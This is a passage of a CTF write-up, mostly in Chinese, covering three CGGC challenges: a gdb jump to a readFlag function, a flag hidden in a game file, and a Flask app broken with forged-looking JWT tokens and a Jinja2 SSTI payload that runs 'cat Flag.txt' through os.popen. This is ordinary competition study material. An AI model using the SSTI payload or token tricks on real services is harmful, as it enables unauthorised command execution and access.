</span></span><span style=display:flex><span>       <span style=color:#f92672>&amp;&amp;</span>%%%%#%%%%%%%&amp;@....... .,<span style=color:#f92672>(</span>,.,,..<span style=color:#f92672>&amp;&amp;</span><span style=color:#75715e>##%%%%&amp;</span>
</span></span><span style=display:flex><span>      %%&amp;<span style=color:#75715e>#&amp;%&amp;%%&amp;%%%%@&amp;&amp;&amp;&amp;@%%%%#.... .  &amp;&amp;%%%&amp;%%#%%%%%#</span>
</span></span><span style=display:flex><span>    @<span style=color:#f92672>&amp;&amp;</span>&amp;%<span style=color:#f92672>&amp;&amp;</span>%%%%%%%%%%<span style=color:#f92672>&amp;&amp;</span>%..  ,,,       <span style=color:#75715e>#%%%%%%%#%%%%%%%%%%&amp;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&amp;&amp;</span>@%<span style=color:#f92672>&amp;&amp;</span>%<span style=color:#f92672>&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>&amp;%%%%<span style=color:#f92672>&amp;&amp;</span>&amp;%...*,   ..   /%%%%%%&amp;%%%%%%%%%%%%%%%
</span></span><span style=display:flex><span>&amp;<span style=color:#75715e>#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%&amp;&amp;%%%%%&amp;%%%...@#,*      %%%%%%%%%%%%%%%&amp;%%%%&amp;%%</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&amp;&amp;</span>%&amp;@&amp;@@&amp;%<span style=color:#f92672>&amp;&amp;&amp;&amp;</span>%&amp;%%&amp;%%%%  ,,%*/    . &amp;%%%%%<span style=color:#f92672>&amp;&amp;</span>&amp;%%%%%%%%%%%%%%#
</span></span><span style=display:flex><span><span style=color:#f92672>&amp;&amp;&amp;&amp;&amp;&amp;</span>&amp;@@<span style=color:#f92672>&amp;&amp;&amp;&amp;</span>%%&amp;%%%%%<span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>(</span>&amp;<span style=color:#75715e>#/.&amp;@... @%%%%%%&amp;%%%%#%%%%%%%%%%#%</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to the Charitable Lag Vegas!
</span></span><span style=display:flex><span>Anyone can participate with three million US dollars.
</span></span><span style=display:flex><span>You play with <span style=color:#ae81ff>52</span> cards with <span style=color:#f92672>(</span>S<span style=color:#f92672>)</span>pades, <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span>lub, <span style=color:#f92672>(</span>H<span style=color:#f92672>)</span>earts, <span style=color:#f92672>(</span>D<span style=color:#f92672>)</span>iamond.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Game 1: Predict the first <span style=color:#ae81ff>8</span> cards I draw in exact order.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Input example: <span style=color:#e6db74>&#34;C8&#34;</span>.
</span></span><span style=display:flex><span>Card 1: ^C
</span></span><span style=display:flex><span>Program received signal SIGINT, Interrupt.
</span></span><span style=display:flex><span>0x0000000000422d61 in read <span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>Warning: <span style=color:#e6db74>&#39;set logging on&#39;</span>, an alias <span style=color:#66d9ef>for</span> the command <span style=color:#e6db74>&#39;set logging enabled&#39;</span>, is deprecated.
</span></span><span style=display:flex><span>Use <span style=color:#e6db74>&#39;set logging enabled on&#39;</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gef➤  p &amp;readFlag
</span></span><span style=display:flex><span>$1 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>&lt;text variable, no debug info&gt; *<span style=color:#f92672>)</span> 0x4018dc &lt;readFlag&gt;
</span></span><span style=display:flex><span>gef➤  j *0x4018dc
</span></span><span style=display:flex><span>Continuing at 0x4018dc.
</span></span><span style=display:flex><span>CGGC<span style=color:#f92672>{</span>J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r<span style=color:#f92672>}</span>�
</span></span></code></pre></div><p>Flag: <code>CGGC{J00_sh4ll_n07_sH1P_S3cR37S_70_cuS70M3r}</code></p><h2 id=space-game>Space game
<a class=anchor href=#space-game>#</a></h2><h3 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h3><p>這一題因為是賽後才寫WP，所以沒有甚麼太詳細的資訊可以記錄，不過這一題的確很misc，但通靈的方向屢屢受挫</p><ol><li>首先題目給予一個網頁型的小遊戲(算是類似七八零年代的那種飛船打外星人的那種)，然後過關的條件是要至少活到最後並且打死30個以上的敵人，但這其實根本就和解題沒關係</li><li>如果從動態看，可以看到他import一個檔案(game.gb)，misc的地方在於他把flag藏在這個檔案中，所以其實和遊戲一點關係都沒有(心累啊!!!!!)</li></ol><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><p><img src=https://hackmd.io/_uploads/HJSpjdKrT.png alt=圖片>
如果實際去看他的binary，會發現有蠻多個flag，但學長測試下來正確的是<code>CGGC{Y0U_WIN!!123}</code></p><p>Flag: <code>CGGC{Y0U_WIN!!123}</code></p><h2 id=bossti>Bossti
<a class=anchor href=#bossti>#</a></h2><h3 id=background>Background
<a class=anchor href=#background>#</a></h3><p>JWT(maybe??)
SSTI</p><h3 id=source-code-1>Source code
<a class=anchor href=#source-code-1>#</a></h3><h3 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h3><p>這一題也是搞心態，一開始以為他是和jwt有關的題目，所以在第一天打的時候，有嘗試過直接把jwt token改變，但卻過不了，到了第二天用一樣的token卻有不一樣的效果，不知道是不是server有問題或是作者有更新
<img src=https://hackmd.io/_uploads/Hy-thOKSp.png alt=圖片></p><ol><li>admin頁面
Payload: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJyb2xlIjoiYWRtaW4iLCJoYWNrIjoiIn0.kmCiItAN6q9xCmrZ1uqhZZP96_pqD5RBMp1Umv0HFKM</code>
<img src=https://hackmd.io/_uploads/Sk6EGttST.png alt="螢幕擷取畫面 2023-12-03 121645"></li><li>boss頁面
Payload: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIifQ.VhS5VSRlR_RrgIlF-gdl-s1_PVHPQCxB3s8oHgwEPJ4</code>
<img src=https://hackmd.io/_uploads/B17DfKKSa.png alt=圖片></li><li>其實看了URL<code>http://10.99.111.109:5000/admin?data={%27user_id%27%3A+2,+%27role%27%3A+%27admin%27,+%27hack%27%3A+%27%27}</code>或<code>http://10.99.111.109:5000/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27%27}</code>才覺得應該和jwt認證沒關係，因為就算換到一個無痕頁面也一樣可以看得到，但重點是boss的頁面有給一個疑似是SSTI的提示(7*7=49經典的payload)，所以剩下的事情就是SSTI payload瘋狂輸出拿flag</li></ol><h3 id=exploit---ssti>Exploit - SSTI
<a class=anchor href=#exploit---ssti>#</a></h3><p>Payload: <code>/boss?data={%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27{{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}%27}</code>
<img src=https://hackmd.io/_uploads/Byxfw7KYSa.png alt=圖片></p><p>Flag: <code>CGGC{"S$T1_V3RY_EZ_2_Pwn3D_C0ngr4t$"}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#gaoyi>GaoYi</a><ul><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li></ul></li><li><a href=#space-game>Space game</a><ul><li><a href=#recon-1>Recon</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#bossti>Bossti</a><ul><li><a href=#background>Background</a></li><li><a href=#source-code-1>Source code</a></li><li><a href=#recon-2>Recon</a></li><li><a href=#exploit---ssti>Exploit - SSTI</a></li></ul></li></ul></nav></div></aside></main></body></html>